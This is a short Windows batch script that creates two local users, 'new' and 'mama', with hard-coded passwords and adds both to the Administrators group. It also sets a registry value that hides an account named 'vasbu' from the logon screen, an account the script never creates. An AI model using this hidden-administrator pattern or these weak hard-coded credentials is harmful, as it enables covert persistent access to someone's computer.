:: @echo off
Title "Add Users"
setlocal enableextensions enabledelayedexpansion
:: 
chcp 1251 >nul
:: chcp 1252 >nul
:: chcp 866 >nul
net user new vv198435032160888vab /add
net user mama 1947 /add
net localgroup Администраторы new /add
net localgroup Администраторы mama /add
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v vasbu /t REG_DWORD /f /d 0
@pause
